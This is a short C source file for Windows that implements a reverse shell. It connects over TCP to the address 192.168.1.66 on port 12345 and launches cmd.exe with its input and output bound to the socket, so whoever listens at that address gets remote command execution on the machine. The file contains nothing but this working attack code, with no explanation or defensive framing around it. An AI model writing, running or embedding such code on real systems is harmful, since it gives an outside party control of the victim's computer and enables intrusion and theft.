#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

int main(){


    int conn;
    SOCKET sock;
    struct sockaddr_in sockadres;
    int serv;
    char buffer[1024];
    PROCESS_INFORMATION pi;
    WSADATA wsa;
    STARTUPINFO si;

    WSAStartup(MAKEWORD(2,0),&wsa);

    sock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);

    sockadres.sin_addr.s_addr=inet_addr("192.168.1.66");
    sockadres.sin_family=AF_INET;
    sockadres.sin_port=htons(12345);

    conn=WSAConnect(sock,(struct sockaddr*)&sockadres,sizeof(sockadres),NULL,NULL,NULL,NULL);

        recv(sock,buffer,sizeof(buffer),0);
        memset(&si, 0, sizeof(si));
        si.cb=sizeof(si);
        si.dwFlags=(STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW);
        si.hStdInput=(HANDLE)sock;
        si.hStdError=(HANDLE)sock;
        si.hStdOutput=(HANDLE)sock;

        CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
        WaitForSingleObject(pi.hProcess,INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
}